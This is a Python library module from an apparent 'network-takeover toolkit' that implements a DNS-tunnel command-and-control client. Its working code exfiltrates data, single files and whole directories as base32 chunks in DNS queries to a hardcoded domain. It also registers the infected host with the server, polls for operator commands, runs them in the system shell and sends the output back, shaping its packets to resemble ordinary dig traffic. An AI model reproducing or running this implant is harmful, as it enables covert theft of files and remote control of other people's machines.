#!/usr/bin/env python3
# v1.1
"""
dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.

Library module used by main.py when --remote is passed.  Provides:
  - Two-way handshake to confirm the C2 server is alive before proceeding
  - Chunked base32 data exfiltration over DNS A queries (same wire format as
    dns_tunnel_client so the existing dns_tunnel_server receives it correctly)
  - Operator command polling via TXT queries
  - File and directory exfiltration helpers for the debug menu

Handshake protocol (new subdomain types added to dns_tunnel_server):
    client  → A query   : hello.<agent_id>.<domain>   (register / heartbeat)
    server  → records agent registration
    client  → TXT query : status.<agent_id>.<domain>
    server  → TXT "ACK" if agent is registered, "NONE" otherwise

The server side lives in scapy/dns tunnel/dns_tunnel_server.py.
"""

import base64
import os
import platform
import random
import re
import socket
import string
import subprocess
import threading
import time

from scapy.all import IP, UDP, send, sr1, conf
from scapy.layers.dns import DNS, DNSQR, DNSRR

conf.verb = 0

# ── Defaults ──────────────────────────────────────────────────────────────────

DEFAULT_DOMAIN = "d.lootforge.org"
CHUNK_SIZE = 50
QUERY_DELAY = 0.3
HANDSHAKE_TIMEOUT = 15
COMMAND_POLL_INTERVAL = 60


# ── System DNS discovery ───────────────────────────────────────────────────────

def get_system_dns() -> str:
    """Return the system's first configured DNS resolver, or 8.8.8.8."""
    candidates = []
    if platform.system() == "Windows":
        try:
            out = subprocess.check_output(
                ["netsh", "interface", "ip", "show", "dns"],
                stderr=subprocess.DEVNULL, text=True, timeout=5,
            )
            for line in out.splitlines():
                if re.search(r"DNS", line, re.IGNORECASE):
                    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
                    if m:
                        candidates.append(m.group(1))
        except Exception:
            pass
    else:
        try:
            with open("/etc/resolv.conf") as fh:
                for line in fh:
                    if line.startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2:
                            candidates.append(parts[1])
        except Exception:
            pass
    return candidates[0] if candidates else "8.8.8.8"


# ── Encoding helpers ───────────────────────────────────────────────────────────

def _b32enc(data: bytes) -> str:
    return base64.b32encode(data).decode().rstrip("=").lower()


def _b32dec(s: str) -> bytes:
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))


def _gen_session() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def gen_agent_id() -> str:
    """Derive a short agent ID from the hostname so it is recognisable at the C2."""
    raw = re.sub(r"[^a-z0-9]", "", socket.gethostname().lower())[:6]
    suffix = "".join(random.choices(string.digits, k=3))
    return (raw or "agent") + suffix


# ── Raw DNS helpers ────────────────────────────────────────────────────────────

def _opt_rr():
    """EDNS0 OPT record matching what dig sends by default.

    rclass=1232  post-2020 flag-day UDP payload size
    ttl=0        no DNSSEC OK bit, extended RCODE 0
    rdata        EDNS COOKIE option (RFC 7873, code 10):
                   \x00\x0a  option code 10
                   \x00\x08  option length 8
                   8 random bytes  client cookie
                 dig derives this via SipHash over (client_ip, server_ip,
                 per-process secret); random bytes are indistinguishable to
                 an observer who cannot verify the derivation.
    """
    cookie = b"\x00\x0a\x00\x08" + os.urandom(8)
    return DNSRR(rrname=b".", type=41, rclass=1232, ttl=0, rdata=cookie)


def _query_a(qname: str, dns_server: str) -> None:
    """Fire-and-forget DNS A query (no response expected)."""
    pkt = (
        IP(dst=dns_server)
        / UDP(sport=random.randint(1024, 65534), dport=53)
        / DNS(id=random.randint(0, 65535), rd=1, ad=1,
              qd=DNSQR(qname=qname, qtype="A"), ar=_opt_rr())
    )
    send(pkt, verbose=0)


def _query_txt(qname: str, dns_server: str):
    """Send a DNS TXT query and return the response packet (or None on timeout)."""
    pkt = (
        IP(dst=dns_server)
        / UDP(sport=random.randint(1024, 65534), dport=53)
        / DNS(id=random.randint(0, 65535), rd=1, ad=1,
              qd=DNSQR(qname=qname, qtype="TXT"), ar=_opt_rr())
    )
    return sr1(pkt, timeout=5, verbose=0)


def _extract_txt(resp) -> str | None:
    """Pull the first TXT rdata value from a DNS response packet."""
    if resp is None or not resp.haslayer(DNS):
        return None
    dns = resp[DNS]
    if dns.ancount == 0:
        return None
    rr = dns.an
    while rr:
        if hasattr(rr, "type") and rr.type == 16:
            raw = rr.rdata
            if isinstance(raw, (list, tuple)):
                raw = b"".join(raw)
            if isinstance(raw, bytes):
                return raw.decode("utf-8", errors="ignore").strip()
            return str(raw).strip()
        payload = getattr(rr, "payload", None)
        if payload is None or payload.__class__.__name__ == "NoPayload":
            break
        rr = payload
    return None


# ── Exfiltration ───────────────────────────────────────────────────────────────

def exfiltrate(data, domain: str, dns_server: str, session_id: str = None) -> str:
    """
    Encode data and send it to the C2 as a series of DNS A queries.

    Wire format (same as dns_tunnel_client):
        <b32chunk>.<seq>.<total>.<session_id>.<domain>

    Returns the session_id so the caller can reference this transfer.
    """
    if isinstance(data, str):
        data = data.encode("utf-8")
    session_id = session_id or _gen_session()
    encoded = _b32enc(data)
    chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)
    print(f"[C2] Exfiltrating {len(data)}B → {total} chunk(s)  session={session_id}")
    for idx, chunk in enumerate(chunks):
        _query_a(f"{chunk}.{idx}.{total}.{session_id}.{domain}", dns_server)
        time.sleep(QUERY_DELAY)
    print(f"[C2] Exfiltration done  session={session_id}")
    return session_id


def exfiltrate_file(path: str, domain: str, dns_server: str) -> bool:
    """
    Read a file and exfiltrate its contents.

    Prepends a FILE:<basename>: header so the operator can identify the source.
    Returns True on success, False if the file could not be read.
    """
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError as exc:
        print(f"[C2] Cannot read {path}: {exc}")
        return False
    payload = f"FILE:{os.path.basename(path)}:".encode() + data
    exfiltrate(payload, domain, dns_server)
    return True


def exfiltrate_dir(dirpath: str, domain: str, dns_server: str) -> int:
    """
    Exfiltrate every file under dirpath (recursive).

    Returns the number of files successfully sent.
    """
    count = 0
    if not os.path.isdir(dirpath):
        return 0
    for root, _, files in os.walk(dirpath):
        for fname in sorted(files):
            if exfiltrate_file(os.path.join(root, fname), domain, dns_server):
                count += 1
    return count


# ── Handshake ─────────────────────────────────────────────────────────────────

def perform_handshake(
    agent_id: str,
    domain: str,
    dns_server: str,
    timeout: int = HANDSHAKE_TIMEOUT,
) -> bool:
    """
    Confirm the C2 server is alive and aware of this agent.

    Protocol:
      1. Send A query  hello.<agent_id>.<domain>   (register with server)
      2. Poll TXT query status.<agent_id>.<domain> until server replies "ACK"
      3. Re-send hello halfway through the timeout in case the first was dropped

    Returns True if ACK received within timeout, False otherwise.
    """
    print(f"[C2] Handshaking — agent={agent_id}  domain={domain}  server={dns_server}")
    _query_a(f"hello.{agent_id}.{domain}", dns_server)
    deadline = time.monotonic() + timeout
    resent = False
    while time.monotonic() < deadline:
        resp = _query_txt(f"status.{agent_id}.{domain}", dns_server)
        txt = _extract_txt(resp)
        if txt and txt.upper() == "ACK":
            print("[C2] Handshake OK — C2 is alive")
            return True
        remaining = deadline - time.monotonic()
        if not resent and remaining < timeout / 2:
            _query_a(f"hello.{agent_id}.{domain}", dns_server)
            resent = True
        time.sleep(1)
    print(f"[C2] Handshake timed out after {timeout}s")
    return False


# ── Command polling ────────────────────────────────────────────────────────────

def poll_command_once(domain: str, dns_server: str) -> str | None:
    """
    Check command.<domain> for a pending operator command.

    Returns the decoded command string, or None if no command is queued.
    """
    resp = _query_txt(f"command.{domain}", dns_server)
    txt = _extract_txt(resp)
    if txt is None or txt.upper() == "NONE":
        return None
    try:
        return _b32dec(txt).decode("utf-8")
    except Exception:
        return txt


def start_command_poll(
    domain: str,
    dns_server: str,
    interval: int = COMMAND_POLL_INTERVAL,
    execute_cb=None,
) -> threading.Thread:
    """
    Start a daemon thread that polls for operator commands on a fixed interval.

    execute_cb(cmd: str) is called when a command arrives.  Defaults to running
    the command in the system shell and exfiltrating the output back to C2.
    """
    def _default_exec(cmd: str) -> None:
        print(f"[C2] Executing: {cmd}")
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30,
            )
            output = result.stdout + result.stderr or f"[exit {result.returncode}]"
        except subprocess.TimeoutExpired:
            output = "[ERROR] command timed out after 30s"
        except Exception as exc:
            output = f"[ERROR] {exc}"
        exfiltrate(output, domain, dns_server)

    cb = execute_cb or _default_exec

    def _loop() -> None:
        while True:
            time.sleep(interval)
            try:
                cmd = poll_command_once(domain, dns_server)
                if cmd:
                    print(f"\n[C2!!!] Command received: {cmd}")
                    threading.Thread(target=cb, args=(cmd,), daemon=True).start()
            except Exception as exc:
                print(f"[C2] Poll error: {exc}")

    t = threading.Thread(target=_loop, daemon=True, name="c2-poll")
    t.start()
    return t


if __name__ == "__main__":
    print("dns_c2.py is a library module.  Run the toolkit via:  sudo python3 main.py --remote")
